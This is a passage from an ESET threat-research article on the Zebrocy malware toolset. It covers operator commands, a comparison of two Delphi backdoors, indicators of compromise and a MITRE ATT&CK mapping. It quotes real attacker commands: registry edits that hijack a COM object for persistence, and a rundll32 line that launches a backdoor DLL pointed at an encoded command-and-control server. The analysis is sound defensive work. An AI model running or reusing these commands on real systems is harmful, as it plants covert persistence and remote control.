<td style="width: 122.35px;"><strong><span style="font-family: courier new, courier, monospace;">CMD_EXECUTE</span></strong></td>
<td style="width: 1240.65px;">
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581bd018778956865202" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
reg add "HKCU\Software\Classes\CLSID\{0CD069CF-AC9B-41F4-9571-3A95A62C36A1}" /ve /d "Reliability Maintenance Control Panel" /reg:64 /f&amp;&amp;reg add "HKCU\Software\Classes\CLSID\{0CD069CF-AC9B-41F4-9571-3A95A62C36A1}\InProcServer32" /ve /d "%APPDATA%\Microsoft\WinSupport\RMC\mtrcpl.dll" /reg:64 /f&amp;&amp;reg add "HKCU\Software\Classes\CLSID\{0CD069CF-AC9B-41F4-9571-3A95A62C36A1}\InProcServer32" /v "ThreadingModel" /t REG_SZ /d "Both" /reg:64 /f
rundll32.exe "%APPDATA%\Microsoft\WinSupport\RMC\mtrcpl.dll",#1 687474703A2F2F[REDACTED]
dir /s /b /o:gn %APPDATA%\Microsoft\</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581bd018778956865202-1">1</div><div class="crayon-num" data-line="crayon-60581bd018778956865202-2">2</div><div class="crayon-num" data-line="crayon-60581bd018778956865202-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581bd018778956865202-1"><span class="crayon-e">reg </span><span class="crayon-i">add</span><span class="crayon-h"> </span><span class="crayon-s">"HKCU\Software\Classes\CLSID\{0CD069CF-AC9B-41F4-9571-3A95A62C36A1}"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">ve</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">d</span><span class="crayon-h"> </span><span class="crayon-s">"Reliability Maintenance Control Panel"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">reg</span><span class="crayon-o">:</span><span class="crayon-cn">64</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">f</span><span class="crayon-o">&amp;&amp;</span><span class="crayon-e">reg </span><span class="crayon-i">add</span><span class="crayon-h"> </span><span class="crayon-s">"HKCU\Software\Classes\CLSID\{0CD069CF-AC9B-41F4-9571-3A95A62C36A1}\InProcServer32"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">ve</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">d</span><span class="crayon-h"> </span><span class="crayon-s">"%APPDATA%\Microsoft\WinSupport\RMC\mtrcpl.dll"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">reg</span><span class="crayon-o">:</span><span class="crayon-cn">64</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">f</span><span class="crayon-o">&amp;&amp;</span><span class="crayon-e">reg </span><span class="crayon-i">add</span><span class="crayon-h"> </span><span class="crayon-s">"HKCU\Software\Classes\CLSID\{0CD069CF-AC9B-41F4-9571-3A95A62C36A1}\InProcServer32"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">v</span><span class="crayon-h"> </span><span class="crayon-s">"ThreadingModel"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">t</span><span class="crayon-h"> </span><span class="crayon-v">REG_SZ</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">d</span><span class="crayon-h"> </span><span class="crayon-s">"Both"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">reg</span><span class="crayon-o">:</span><span class="crayon-cn">64</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">f</span></div><div class="crayon-line" id="crayon-60581bd018778956865202-2"><span class="crayon-v">rundll32</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span><span class="crayon-s">"%APPDATA%\Microsoft\WinSupport\RMC\mtrcpl.dll"</span><span class="crayon-sy">,</span><span class="crayon-p">#1 687474703A2F2F[REDACTED]</span></div><div class="crayon-line" id="crayon-60581bd018778956865202-3"><span class="crayon-v">dir</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">b</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">o</span><span class="crayon-o">:</span><span class="crayon-v">gn</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-v">APPDATA</span><span class="crayon-o">%</span><span class="crayon-sy">\</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->

</td>
</tr>
</tbody>
</table>
<p>There are some interesting facts here. First, they use COM object hijacking to make the malware persistent on the system even though the custom backdoor is installed only for a few hours. Second, the hex-encoded string is the C&amp;C used by the custom backdoor while in the Delphi backdoor the C&amp;C is embedded in the configuration.</p>
<p>The two Delphi backdoors, the common one and the one above, are quite similar but contain these interesting tweaks:</p>

<table id="tablepress-689" class="tablepress tablepress-id-689">
<thead>
<tr class="row-1 odd">
	<th class="column-1">&nbsp;</th><th class="column-2"><strong>Delphi backdoor</strong></th><th class="column-3"><strong>Downloaded Delphi backdoor</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><strong>Delphi compiler version</strong></td><td class="column-2">14.0-15.0</td><td class="column-3">32.0</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><strong>32/64-bit</strong></td><td class="column-2">32-bit</td><td class="column-3">64-bit</td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><strong>Configuration location</strong></td><td class="column-2">resource section</td><td class="column-3">no config (C&amp;C is passed as an argument)</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><strong>Number of commands</strong></td><td class="column-2">5</td><td class="column-3">3</td>
</tr>
<tr class="row-6 even">
	<td class="column-1"><strong>Encryption algorithm</strong></td><td class="column-2">AES ECB</td><td class="column-3">custom</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1"><strong>Lifetime on the computer</strong></td><td class="column-2">a few days</td><td class="column-3">a few hours</td>
</tr>
</tbody>
</table>

<p>Once again, it’s not very clear what the purpose of this custom backdoor is. The detection ratio is definitely lower in comparison to the “usual” backdoor. The very short timeframe where this backdoor is on the system and operating makes it harder to retrieve. Once its operators complete their evil deeds, they quickly remove it.</p>
<h1>Summary</h1>
<p>Observing commands used in the wild by the operator is quite interesting. They are gathering a considerable amount of information on the compromised target and they are not worried about duplicated data. It shows a large gap between the development strategy and what operators do in practice. Backdoors with custom configuration and modules are deployed very carefully, which indicates some precautions to avoid ending up in the hands of researchers.</p>
<p>The first set of commands is the same and executed during a very short timeframe, which raises another question: is it automated?</p>
<h1>Indicators of Compromise (IoCs)</h1>

<table id="tablepress-692" class="tablepress tablepress-id-692">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Distribution URL</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">http://45.124.132[.]127/DOVIDNIK - (2018).zip</span></td>
</tr>
</tbody>
</table>


<table id="tablepress-693" class="tablepress tablepress-id-693">
<thead>
<tr class="row-1 odd">
	<th class="column-1">C&amp;C server</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">http://45.124.132[.]127/action-center/centerforserviceandaction/service-and-action.php</span></td>
</tr>
</tbody>
</table>


<table id="tablepress-690" class="tablepress tablepress-id-690">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1</th><th class="column-2">ESET detection names</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">48f8b152b86bed027b9152725505fbf4a24a39fd</span></td><td class="column-2">Win32/TrojanDownloader.Sednit.CMT</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">1e9f40ef81176190e1ed9a0659473b2226c53f57</span></td><td class="column-2">Win32/HackTool.PSWDump.D</td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">bfa26857575c49abb129aac87207f03f2b062e07</span></td><td class="column-2">Win32/PSW.Agent.OGE</td>
</tr>
</tbody>
</table>

<h1>MITRE ATT&amp;CK techniques</h1>

<table id="tablepress-691" class="tablepress tablepress-id-691">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Tactic</th><th class="column-2">ID</th><th class="column-3">Name</th><th class="column-4">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">Initial Access</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1192/" rel="noopener" target="_blank">T1192</a></td><td class="column-3">Spearphishing Link</td><td class="column-4">Spearphishing emails using a URL-shortener service to trick the victim into clicking on a link to a zip file containing malicious files.</td>
</tr>
<tr class="row-3 odd">
	<td rowspan="4" class="column-1">Execution</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1204/" rel="noopener" target="_blank">T1204</a></td><td class="column-3">User Execution</td><td class="column-4">Tricks users into running an executable with an icon that looks like a Microsoft Word document.</td>
</tr>
<tr class="row-4 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1085/" rel="noopener" target="_blank">T1085</a></td><td class="column-3">Rundll32</td><td class="column-4">rundll32.exe has been used to run a new, downloaded, malicious DLL.</td>
</tr>
<tr class="row-5 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1047/" rel="noopener" target="_blank">T1047</a></td><td class="column-3">Windows Management Instrumentation</td><td class="column-4">WMI commands to gather victim host details.</td>
</tr>
<tr class="row-6 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1053/" rel="noopener" target="_blank">T1053</a></td><td class="column-3">Scheduled Task</td><td class="column-4">Schedule task to execute malicious binaries.</td>
</tr>
<tr class="row-7 odd">
	<td rowspan="2" class="column-1">Persistence</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1060/" rel="noopener" target="_blank">T1060</a></td><td class="column-3">Registry Run Keys / Startup Folder</td><td class="column-4">Registry key HKCU\Software\Microsoft\CurrentVersion\Run\ used for persistence.</td>
</tr>
<tr class="row-8 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1122/" rel="noopener" target="_blank">T1122</a></td><td class="column-3">Component Object Model Hijacking</td><td class="column-4">COM hijacking for persistence.</td>
</tr>
<tr class="row-9 odd">
	<td rowspan="2" class="column-1">Defense Evasion</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1107/" rel="noopener" target="_blank">T1107</a></td><td class="column-3">File Deletion</td><td class="column-4">Deletes files (binaries and files created) after usage.</td>
</tr>
<tr class="row-10 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1089/" rel="noopener" target="_blank">T1089</a></td><td class="column-3">Disabling Security Tools</td><td class="column-4">Kills processes</td>
</tr>
<tr class="row-11 odd">
	<td rowspan="4" class="column-1">Discovery</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1012/" rel="noopener" target="_blank">T1012</a></td><td class="column-3">Query Registry</td><td class="column-4">Registry keys enumeration</td>
</tr>
<tr class="row-12 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1057/" rel="noopener" target="_blank">T1057</a></td><td class="column-3">Process Discovery</td><td class="column-4">Lists running processes</td>
</tr>
<tr class="row-13 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1082/" rel="noopener" target="_blank">T1082</a></td><td class="column-3">System Information Discovery</td><td class="column-4">Uses <em>systeminfo  </em>command  to gather information about the victim.</td>
</tr>
<tr class="row-14 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1083/" rel="noopener" target="_blank">T1083</a></td><td class="column-3">File and Directory Discovery</td><td class="column-4">Uses <em>echo ENV</em> command to list the content of a directory.</td>
</tr>
<tr class="row-15 odd">
	<td rowspan="6" class="column-1">Collection</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1005/" rel="noopener" target="_blank">T1005</a></td><td class="column-3">Data from Local System</td><td class="column-4">Scans files that match extensions listed in the malware.</td>
</tr>
<tr class="row-16 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1039/" rel="noopener" target="_blank">T1039</a></td><td class="column-3">Data from Network Shared Drive</td><td class="column-4">Enumerates remote and local drives and then exfiltrates files matching specific extensions.</td>
</tr>
<tr class="row-17 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1025/" rel="noopener" target="_blank">T1025</a></td><td class="column-3">Data from Removable Media</td><td class="column-4">Enumerates remote and local drives and then exfiltrates files matching specific extensions.</td>
</tr>
<tr class="row-18 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1074/" rel="noopener" target="_blank">T1074</a></td><td class="column-3">Data Staged</td><td class="column-4">Creates file containing path of all files to exfiltrate.</td>
</tr>
<tr class="row-19 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1056/" rel="noopener" target="_blank">T1056</a></td><td class="column-3">Input Capture</td><td class="column-4">Keylogger feature.</td>
</tr>
<tr class="row-20 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1113/" rel="noopener" target="_blank">T1113</a></td><td class="column-3">Screen Capture</td><td class="column-4">Screenshot feature.</td>
</tr>
<tr class="row-21 odd">
	<td rowspan="3" class="column-1">Exfiltration</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1020/" rel="noopener" target="_blank">T1020</a></td><td class="column-3">Automated Exfiltration</td><td class="column-4">Automatically prepare a file with all file paths to retrieve and send it.</td>
</tr>
<tr class="row-22 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1022/" rel="noopener" target="_blank">T1022</a></td><td class="column-3">Data Encrypted</td><td class="column-4">Data sent are hex-encoded, encrypted with a known algorithm or a custom one.</td>
</tr>
<tr class="row-23 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1041/" rel="noopener" target="_blank">T1041</a></td><td class="column-3">Exfiltration Over Command and Control Channel</td><td class="column-4">Data are exfiltrated to a C&amp;C server.</td>
</tr>
<tr class="row-24 even">
	<td rowspan="8" class="column-1">Command And Control</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1043/" rel="noopener" target="_blank">T1043</a></td><td class="column-3">Commonly Used Port</td><td class="column-4">Downloaders and backdoors use ports 80 or 443 to communicate with the C&amp;C server.</td>
</tr>
<tr class="row-25 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1024/" rel="noopener" target="_blank">T1024</a></td><td class="column-3">Custom Cryptographic Protocol</td><td class="column-4">Data sent are hex encoded, encrypted with AES or a custom algorithm.</td>
</tr>
<tr class="row-26 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1132/" rel="noopener" target="_blank">T1132</a></td><td class="column-3">Data Encoding</td><td class="column-4">Data sent are hex-encoded, encrypted with a known algorithm or a custom one.</td>
</tr>
<tr class="row-27 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1001/" rel="noopener" target="_blank">T1001</a></td><td class="column-3">Data Obfuscation</td><td class="column-4">Data sent are hex-encoded, encrypted with a known algorithm or a custom one.</td>
</tr>
<tr class="row-28 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1008/" rel="noopener" target="_blank">T1008</a></td><td class="column-3">Fallback Channels</td><td class="column-4">A fallback C&amp;C server is embedded in the configuration.</td>
</tr>
<tr class="row-29 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1079/" rel="noopener" target="_blank">T1079</a></td><td class="column-3">Multilayer Encryption</td><td class="column-4">Data sent are hex-encoded, encrypted with a known algorithm or a custom one.</td>
</tr>
<tr class="row-30 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1071/" rel="noopener" target="_blank">T1071</a></td><td class="column-3">Standard Application Layer Protocol</td><td class="column-4">HTTP, HTTPS are used to communicate.</td>
</tr>
<tr class="row-31 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1032/" rel="noopener" target="_blank">T1032</a></td><td class="column-3">Standard Cryptographic Protocol</td><td class="column-4">Data sent are hex-encoded, encrypted with a known algorithm or a custom one.</td>
</tr>
</tbody>
</table>


                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2019-05-22 11:30:35">22 May 2019 - 11:30AM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="A journey to Zebrocy land">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/exchange-servers-under-siege-10-apt-groups-623x432.jpg"
                                                         alt="A journey to Zebrocy land">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/">
                                                    Exchange servers under siege from at least 10 APT groups                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/apple-m1-macs-malware-1-623x432.jpg"
                                                         alt="A journey to Zebrocy land">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/">
                                                    Malware authors already taking aim at Apple M1 Macs                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/eset-kobalos-hpc-high-performance-computing-malware-research-623x432.jpg"
                                                         alt="A journey to Zebrocy land">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/">
                                                    Kobalos – A complex Linux threat to high performance computing infrastructure                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F22%2Fjourney-zebrocy-land%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F22%2Fjourney-zebrocy-land%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F22%2Fjourney-zebrocy-land%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
